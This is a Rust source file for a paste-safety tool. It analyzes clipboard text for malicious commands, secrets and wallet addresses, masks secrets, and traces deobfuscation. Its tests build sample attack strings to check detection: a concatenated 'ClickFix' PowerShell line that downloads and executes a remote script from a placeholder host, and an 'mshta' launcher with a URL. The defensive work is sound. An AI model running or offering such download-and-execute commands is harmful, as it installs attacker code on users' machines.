//! The Report JSON (docs/plan/phase-2.md §2.2) and the string API shared by the
//! CLI, the MCP server, the WASM build and the Python binding (§2.6).
//!
//! Everything here works on strings so that the wasm-bindgen exports, the raw
//! C ABI and the Python binding are thin wrappers around the same code and
//! produce byte-identical JSON. Byte offsets are converted to UTF-16 here.
//!
//! Privacy (P3/P4): the Report never contains the analyzed text, only masked
//! values and positions; error messages never contain the input text.
#![forbid(unsafe_code)]

use std::borrow::Cow;
use std::sync::OnceLock;

use paste_warden_core::command::{DeobfuscationStep, deobfuscate as core_deobfuscate};
use paste_warden_core::secret::{self, PackSet, SecretKind, SecretMatch};
use paste_warden_core::{
    Action, Context, Engine, Level, Message, Platform, Report, Settings, Source, SourceKind,
    Verdict,
};
use paste_warden_i18n::Localizer;
use serde::{Deserialize, Serialize};

/// Version of the Report JSON shape (§2.2 `schema`).
pub const REPORT_SCHEMA: u32 = 1;

/// Engine version reported to JS / Python (`ENGINE_VERSION`).
pub const ENGINE_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Locale used when the caller does not pass one.
pub const DEFAULT_LOCALE: &str = "zh-TW";

/// Longest output preview of [`deobfuscate`] in chars.
pub const MAX_OUTPUT_PREVIEW_CHARS: usize = 400;

/// A caller error (bad options JSON, unknown enum value). Never contains the
/// analyzed text.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Error(pub String);

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for Error {}

// ---------------------------------------------------------------------------
// Options

/// `opts` of `analyze` (TS `AnalyzeOptions`). Unknown keys are ignored.
#[derive(Debug, Default, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct AnalyzeOptions {
    pub context: Option<ContextOptions>,
    /// Partial [`Settings`]: missing keys take the strict defaults.
    pub settings: Settings,
    pub locale: Option<String>,
}

/// TS `context`.
#[derive(Debug, Default, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct ContextOptions {
    pub source_kind: Option<String>,
    pub url: Option<String>,
    pub app: Option<String>,
    pub platform: Option<String>,
}

impl AnalyzeOptions {
    /// Parses the options JSON; an empty string or `null` means defaults.
    pub fn parse(json: &str) -> Result<AnalyzeOptions, Error> {
        let json = json.trim();
        if json.is_empty() || json == "null" {
            return Ok(AnalyzeOptions::default());
        }
        serde_json::from_str(json).map_err(|e| Error(format!("invalid options: {e}")))
    }

    fn context(&self) -> Result<Context, Error> {
        let Some(c) = &self.context else {
            return Ok(Context::default());
        };
        let kind = match c.source_kind.as_deref() {
            None => None,
            Some(s) => Some(source_kind(s)?),
        };
        let source = if kind.is_some() || c.url.is_some() || c.app.is_some() {
            Some(Source {
                kind: kind.unwrap_or_default(),
                app: c.app.clone(),
                app_id: None,
                url: c.url.clone(),
            })
        } else {
            None
        };
        let platform = match c.platform.as_deref() {
            None => Platform::Unknown,
            Some(p) => platform(p)?,
        };
        Ok(Context { source, platform })
    }

    fn locale(&self) -> &str {
        self.locale.as_deref().unwrap_or(DEFAULT_LOCALE)
    }
}

fn source_kind(s: &str) -> Result<SourceKind, Error> {
    Ok(match s {
        "unknown" => SourceKind::Unknown,
        "browser" => SourceKind::Browser,
        "terminal" => SourceKind::Terminal,
        "ide" => SourceKind::Ide,
        "chat" => SourceKind::Chat,
        "password_manager" | "passwordManager" => SourceKind::PasswordManager,
        "other" => SourceKind::Other,
        _ => return Err(Error("invalid options: unknown context.sourceKind".into())),
    })
}

fn platform(s: &str) -> Result<Platform, Error> {
    Ok(match s {
        "unknown" => Platform::Unknown,
        "windows" => Platform::Windows,
        "macos" => Platform::MacOs,
        "linux" => Platform::Linux,
        "android" => Platform::Android,
        "ios" => Platform::Ios,
        "web" => Platform::Web,
        _ => return Err(Error("invalid options: unknown context.platform".into())),
    })
}

// ---------------------------------------------------------------------------
// Localizers (loading a locale parses every .ftl file: do it once)

/// Shared localizer for `locale` (`zh-TW`, `en`; anything else → `en`).
pub fn localizer(locale: &str) -> &'static Localizer {
    static ZH_TW: OnceLock<Localizer> = OnceLock::new();
    static EN: OnceLock<Localizer> = OnceLock::new();
    if locale.eq_ignore_ascii_case("zh-TW") {
        ZH_TW.get_or_init(|| Localizer::new("zh-TW"))
    } else {
        EN.get_or_init(|| Localizer::new("en"))
    }
}

// ---------------------------------------------------------------------------
// Report JSON (§2.2)

#[derive(Debug, Serialize)]
pub struct ReportJson {
    pub schema: u32,
    pub action: &'static str,
    pub truncated: bool,
    pub command: CommandJson,
    pub secrets: Vec<SecretJson>,
    pub hidden: HiddenJson,
    pub wallets: Vec<WalletJson>,
    /// Optional Tier 2 block (phase-5.md §5.6). Only the CLI's `scan --llm`
    /// fills it; WASM and Python never call a model. Schema version stays 1.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub llm: Option<LlmJson>,
}

/// `"llm": { level, explanation, techniques, provider, model }`.
#[derive(Debug, Serialize)]
pub struct LlmJson {
    pub level: &'static str,
    pub explanation: String,
    pub techniques: Vec<String>,
    pub provider: String,
    pub model: String,
}

#[derive(Debug, Serialize)]
pub struct CommandJson {
    pub level: &'static str,
    pub risk_score: u8,
    pub reasons: Vec<ReasonJson>,
    pub trace: Vec<TraceJson>,
    pub hosts: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct ReasonJson {
    pub id: String,
    pub text: String,
}

#[derive(Debug, Serialize)]
pub struct TraceJson {
    pub kind: &'static str,
    pub text: String,
    /// Masked by the engine.
    pub preview: String,
}

#[derive(Debug, Serialize)]
pub struct SecretJson {
    pub kind: &'static str,
    pub rule_id: String,
    pub label: String,
    pub masked: String,
    /// `[start, length]` in UTF-16 code units (corpus convention).
    pub span_utf16: [usize; 2],
}

#[derive(Debug, Serialize)]
pub struct HiddenJson {
    pub level: &'static str,
    pub reasons: Vec<ReasonJson>,
}

#[derive(Debug, Serialize)]
pub struct WalletJson {
    pub currency: &'static str,
    /// `[start, length]` in UTF-16 code units.
    pub span_utf16: [usize; 2],
}

pub fn action_str(a: Action) -> &'static str {
    match a {
        Action::Allow => "allow",
        Action::Warn => "warn",
        Action::Quarantine => "quarantine",
    }
}

fn reasons(v: &Verdict, loc: &Localizer) -> Vec<ReasonJson> {
    v.reasons
        .iter()
        .map(|m| ReasonJson {
            id: m.id.to_string(),
            text: loc.format(m),
        })
        .collect()
}

fn trace(steps: &[DeobfuscationStep], loc: &Localizer) -> Vec<TraceJson> {
    steps
        .iter()
        .map(|s| TraceJson {
            kind: s.kind.as_str(),
            text: loc.format(&s.message),
            preview: s.preview.clone(),
        })
        .collect()
}

/// Converts many UTF-8 byte offsets of one text to UTF-16 offsets in a single
/// pass (a per-offset scan would be quadratic for many matches in a 1 Mi text).
pub struct Utf16Map {
    /// Sorted, deduplicated `(byte, utf16)` pairs.
    points: Vec<(usize, usize)>,
}

impl Utf16Map {
    pub fn new(text: &str, offsets: impl IntoIterator<Item = usize>) -> Utf16Map {
        let mut bytes: Vec<usize> = offsets.into_iter().map(|b| b.min(text.len())).collect();
        bytes.sort_unstable();
        bytes.dedup();
        let mut points = Vec::with_capacity(bytes.len());
        let mut units = 0usize;
        let mut iter = text.char_indices().peekable();
        for b in bytes {
            while let Some(&(i, c)) = iter.peek() {
                if i >= b {
                    break;
                }
                units += c.len_utf16();
                iter.next();
            }
            points.push((b, units));
        }
        Utf16Map { points }
    }

    /// UTF-16 offset of a byte offset given to [`Utf16Map::new`].
    pub fn get(&self, byte: usize) -> usize {
        match self.points.binary_search_by_key(&byte, |p| p.0) {
            Ok(i) => self.points[i].1,
            // Not registered: the largest known point below (never happens for
            // offsets passed to `new`).
            Err(0) => 0,
            Err(i) => self.points[i - 1].1,
        }
    }

    fn span(&self, start: usize, end: usize) -> [usize; 2] {
        let s = self.get(start);
        [s, self.get(end).saturating_sub(s)]
    }
}

/// Builds the §2.2 Report for `report` (computed from `text`) in `locale`.
pub fn report_json(text: &str, report: &Report, locale: &str) -> ReportJson {
    let loc = localizer(locale);
    let offsets = report
        .secrets
        .iter()
        .flat_map(|m| [m.span.start, m.span.end])
        .chain(
            report
                .wallets
                .iter()
                .flat_map(|w| [w.start, w.start + w.len]),
        );
    let map = Utf16Map::new(text, offsets);
    ReportJson {
        schema: REPORT_SCHEMA,
        action: action_str(report.action),
        truncated: report.truncated,
        command: CommandJson {
            level: report.command.verdict.level.as_str(),
            risk_score: report.command.risk_score,
            reasons: reasons(&report.command.verdict, loc),
            trace: trace(&report.command.trace, loc),
            hosts: report.command.hosts.clone(),
        },
        secrets: report
            .secrets
            .iter()
            .map(|m| SecretJson {
                kind: m.kind.as_str(),
                rule_id: m.rule_id.clone(),
                label: loc.format(&m.label),
                masked: m.masked.clone(),
                span_utf16: map.span(m.span.start, m.span.end),
            })
            .collect(),
        hidden: HiddenJson {
            level: match report.hidden.level {
                Level::None => "none",
                // Hidden-character findings are never Malicious; keep the
                // two-value enum of §2.2 even if that ever changes.
                Level::Suspicious | Level::Malicious => "suspicious",
            },
            reasons: reasons(&report.hidden, loc),
        },
        wallets: report
            .wallets
            .iter()
            .map(|w| WalletJson {
                currency: w.currency.as_str(),
                span_utf16: map.span(w.start, w.start + w.len),
            })
            .collect(),
        llm: None,
    }
}

fn to_json<T: Serialize>(v: &T) -> String {
    // Serializing plain structs of strings and numbers cannot fail.
    serde_json::to_string(v).unwrap_or_else(|_| String::from("null"))
}

/// Analyzes `text` with `opts`; returns the Report as a JSON string.
pub fn analyze(text: &str, opts: &AnalyzeOptions) -> Result<String, Error> {
    Ok(to_json(&analyze_report(text, opts)?))
}

/// Like [`analyze`] but returns the serializable struct.
pub fn analyze_report(text: &str, opts: &AnalyzeOptions) -> Result<ReportJson, Error> {
    let ctx = opts.context()?;
    let engine = Engine::new(opts.settings.clone());
    let report = engine.analyze(text, &ctx);
    Ok(report_json(text, &report, opts.locale()))
}

/// [`analyze`] with the options as a JSON string (TS `AnalyzeOptions`).
pub fn analyze_with_json(text: &str, opts_json: &str) -> Result<String, Error> {
    analyze(text, &AnalyzeOptions::parse(opts_json)?)
}

// ---------------------------------------------------------------------------
// Masking

/// The part of a Report that `mask` needs (`truncated` is ignored: the engine
/// recomputes the analyzed prefix).
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
pub struct MaskInput {
    pub secrets: Vec<MaskSecret>,
}

#[derive(Debug, Default, Deserialize)]
#[serde(default)]
pub struct MaskSecret {
    pub kind: String,
    pub masked: String,
    pub span_utf16: [usize; 2],
}

fn secret_kind(s: &str) -> Result<SecretKind, Error> {
    Ok(match s {
        "national_id" => SecretKind::NationalId,
        "resident_certificate" => SecretKind::ResidentCertificate,
        "business_id" => SecretKind::BusinessId,
        "credit_card" => SecretKind::CreditCard,
        "mobile_phone" => SecretKind::MobilePhone,
        "api_key" => SecretKind::ApiKey,
        "registered" => SecretKind::Registered,
        "phone_number" => SecretKind::PhoneNumber,
        "bank_account" => SecretKind::BankAccount,
        "mnemonic" => SecretKind::Mnemonic,
        _ => return Err(Error("invalid report: unknown secret kind".into())),
    })
}

/// UTF-16 offset → byte offset for many offsets in one pass.
fn utf16_to_bytes(text: &str, units: &[usize]) -> Vec<usize> {
    let mut order: Vec<usize> = (0..units.len()).collect();
    order.sort_unstable_by_key(|&i| units[i]);
    let mut out = vec![text.len(); units.len()];
    let mut iter = text.char_indices().peekable();
    let mut pos = 0usize;
    for i in order {
        let want = units[i];
        // Advance while the next char ends at or before `want`; an offset in
        // the middle of a surrogate pair rounds down (same as `text::utf16_to_byte`).
        while let Some(&(_, c)) = iter.peek() {
            if pos + c.len_utf16() > want {
                break;
            }
            pos += c.len_utf16();
            iter.next();
        }
        out[i] = iter.peek().map_or(text.len(), |&(b, _)| b);
    }
    out
}

/// "Paste masked": `text` with the secrets of `report` (from `analyze(text)`)
/// replaced by their masks. `locale` renders the PEM-body placeholder.
pub fn mask_with_report(text: &str, report: &MaskInput, locale: &str) -> Result<String, Error> {
    let mut units = Vec::with_capacity(report.secrets.len() * 2);
    for s in &report.secrets {
        units.push(s.span_utf16[0]);
        units.push(s.span_utf16[0].saturating_add(s.span_utf16[1]));
    }
    let bytes = utf16_to_bytes(text, &units);
    let mut secrets = Vec::with_capacity(report.secrets.len());
    for (i, s) in report.secrets.iter().enumerate() {
        secrets.push(SecretMatch {
            kind: secret_kind(&s.kind)?,
            rule_id: String::new(),
            label: Message::new("secret-rule-label"),
            masked: s.masked.clone(),
            span: bytes[2 * i]..bytes[2 * i + 1],
        });
    }
    let report = Report {
        command: Default::default(),
        secrets,
        hidden: Verdict::CLEAN,
        wallets: Vec::new(),
        truncated: false,
        action: Action::Allow,
    };
    let pem = localizer(locale).format(&secret::pem_body_mask_message());
    Ok(Engine::default().masked(text, &report, &pem))
}

/// [`mask_with_report`] with the report as a JSON string.
pub fn mask_with_report_json(text: &str, report_json: &str, locale: &str) -> Result<String, Error> {
    let report: MaskInput =
        serde_json::from_str(report_json).map_err(|e| Error(format!("invalid report: {e}")))?;
    mask_with_report(text, &report, locale)
}

/// Analyzes `text` with `settings` and returns the masked text.
pub fn mask(text: &str, settings: &Settings, locale: &str) -> String {
    let engine = Engine::new(settings.clone());
    let report = engine.analyze(text, &Context::default());
    let pem = localizer(locale).format(&secret::pem_body_mask_message());
    engine.masked(text, &report, &pem)
}

// ---------------------------------------------------------------------------
// Messages and deobfuscation

/// All `ui-*` strings of `locale` as a JSON object (`{"ui-app-name": "…"}`).
pub fn messages(locale: &str) -> String {
    let loc = localizer(locale);
    let mut map = serde_json::Map::new();
    for id in loc.ids() {
        if !id.starts_with("ui-") {
            continue;
        }
        let text = loc.format(&Message {
            id: Cow::Owned(id.clone()),
            args: Vec::new(),
        });
        map.insert(id, serde_json::Value::String(text));
    }
    to_json(&map)
}

#[derive(Debug, Serialize)]
pub struct DeobfuscatedJson {
    pub trace: Vec<TraceJson>,
    /// Start of the fully peeled text (at most [`MAX_OUTPUT_PREVIEW_CHARS`]
    /// chars, `…` where cut), secrets masked.
    pub output_preview: String,
    pub capped: bool,
}

/// Deobfuscation trace and a masked preview of the peeled text (MCP
/// `deobfuscate_trace`, Python `deobfuscate`).
pub fn deobfuscate(text: &str, locale: &str) -> DeobfuscatedJson {
    let loc = localizer(locale);
    let d = core_deobfuscate(text);
    let mut head: String = d.output.chars().take(MAX_OUTPUT_PREVIEW_CHARS).collect();
    let cut = head.len() < d.output.len();
    let found = secret::find(&head, &PackSet::all());
    head = secret::mask_text(&head, &found, "…");
    if cut {
        head.push('…');
    }
    DeobfuscatedJson {
        trace: trace(&d.layers, loc),
        output_preview: head,
        capped: d.capped,
    }
}

/// [`deobfuscate`] as a JSON string.
pub fn deobfuscate_json(text: &str, locale: &str) -> String {
    to_json(&deobfuscate(text, locale))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;

    fn clickfix() -> String {
        [
            "power",
            "shell -w hidden -c \"i",
            "ex(i",
            "wr 'https://example.invalid/a.ps1')\"",
        ]
        .concat()
    }

    fn run(text: &str, opts: &str) -> Value {
        serde_json::from_str(&analyze_with_json(text, opts).unwrap()).unwrap()
    }

    #[test]
    fn report_has_the_documented_shape() {
        let v = run(&clickfix(), r#"{"locale":"en"}"#);
        assert_eq!(v["schema"], 1);
        assert_eq!(v["action"], "quarantine");
        assert_eq!(v["truncated"], false);
        assert_eq!(v["command"]["level"], "malicious");
        assert!(v["command"]["risk_score"].as_u64().unwrap() >= 60);
        let r = &v["command"]["reasons"][0];
        assert!(r["id"].as_str().unwrap().starts_with("cmd-"));
        assert!(!r["text"].as_str().unwrap().is_empty());
        assert_eq!(v["command"]["hosts"][0], "example.invalid");
        assert_eq!(v["hidden"]["level"], "none");
        assert!(v["secrets"].as_array().unwrap().is_empty());
        assert!(v["wallets"].as_array().unwrap().is_empty());
    }

    #[test]
    fn secret_spans_are_utf16_start_and_length_and_never_plain() {
        let text = "🔑身分證 A123456789 ok";
        let out = analyze_with_json(text, "").unwrap();
        assert!(!out.contains("A123456789"));
        let v: Value = serde_json::from_str(&out).unwrap();
        let s = &v["secrets"][0];
        assert_eq!(s["kind"], "national_id");
        assert_eq!(s["masked"], "A12****789");
        assert_eq!(s["label"], "身分證字號");
        // 🔑 = 2 units, 身分證 = 3, space = 1.
        assert_eq!(s["span_utf16"], serde_json::json!([6, 10]));
        assert_eq!(v["action"], "warn");
    }

    #[test]
    fn mask_round_trips_through_the_report_json() {
        let text = "a😀 A123456789 and B212345670 end";
        let report = analyze_with_json(text, "").unwrap();
        let masked = mask_with_report_json(text, &report, "en").unwrap();
        assert_eq!(masked, "a😀 A12****789 and B21****670 end");
        assert_eq!(mask(text, &Settings::default(), "en"), masked);
    }

    #[test]
    fn bad_report_spans_do_not_panic() {
        let r = r#"{"secrets":[{"kind":"api_key","masked":"x","span_utf16":[5,99999]},
                    {"kind":"api_key","masked":"y","span_utf16":[18446744073709551615,3]}]}"#;
        for t in ["", "abc", "😀😀😀"] {
            let _ = mask_with_report_json(t, r, "en").unwrap();
        }
        assert!(mask_with_report_json("x", r#"{"secrets":[{"kind":"nope"}]}"#, "en").is_err());
        assert!(mask_with_report_json("x", "not json", "en").is_err());
    }

    #[test]
    fn options_parse_and_errors_do_not_echo_the_text() {
        let secret_text = "A123456789";
        let err =
            analyze_with_json(secret_text, r#"{"context":{"sourceKind":"nope"}}"#).unwrap_err();
        assert!(!err.0.contains(secret_text));
        assert!(analyze_with_json(secret_text, "{").is_err());
        let v = run(secret_text, r#"{"settings":{"detect_secrets":false}}"#);
        assert_eq!(v["action"], "allow");
        let v = run("cmd /c dir", r#"{"context":{"sourceKind":"browser"}}"#);
        assert_eq!(v["command"]["risk_score"], 40);
        let v = run("cmd /c dir", r#"{"context":{"sourceKind":"terminal"}}"#);
        assert_eq!(v["command"]["risk_score"], 20);
    }

    #[test]
    fn wallet_spans() {
        let addr = "0x52908400098527886E0F7030069857D2E4169EE7";
        let v = run(&format!("中文 {addr}"), "");
        let w = &v["wallets"][0];
        assert_eq!(w["currency"], "ethereum");
        assert_eq!(w["span_utf16"], serde_json::json!([3, 42]));
    }

    #[test]
    fn utf16_maps_agree_with_core() {
        let s = "a🔑中b\u{200B}😀";
        let offsets: Vec<usize> = (0..=s.len()).filter(|&i| s.is_char_boundary(i)).collect();
        let map = Utf16Map::new(s, offsets.iter().copied());
        for &b in &offsets {
            assert_eq!(map.get(b), paste_warden_core::text::byte_to_utf16(s, b));
        }
        let units: Vec<usize> = (0..12).collect();
        let bytes = utf16_to_bytes(s, &units);
        for (u, b) in units.iter().zip(bytes) {
            assert_eq!(b, paste_warden_core::text::utf16_to_byte(s, *u), "{u}");
        }
    }

    #[test]
    fn messages_are_ui_strings_in_both_locales() {
        let zh: serde_json::Map<String, Value> = serde_json::from_str(&messages("zh-TW")).unwrap();
        let en: serde_json::Map<String, Value> = serde_json::from_str(&messages("en")).unwrap();
        assert!(zh.contains_key("ui-app-name"));
        assert_eq!(zh.keys().collect::<Vec<_>>(), en.keys().collect::<Vec<_>>());
        assert!(zh.keys().all(|k| k.starts_with("ui-")));
        assert_ne!(zh["ui-action-quarantine"], en["ui-action-quarantine"]);
    }

    #[test]
    fn deobfuscate_masks_the_preview() {
        let d = deobfuscate("'ms'+'hta' https://example.invalid/x", "en");
        assert!(d.trace.iter().any(|t| t.kind == "concat"));
        assert!(d.output_preview.contains("mshta"));
        let d = deobfuscate("'A1234'+'56789'", "en");
        assert!(!d.output_preview.contains("A123456789"));
    }
}
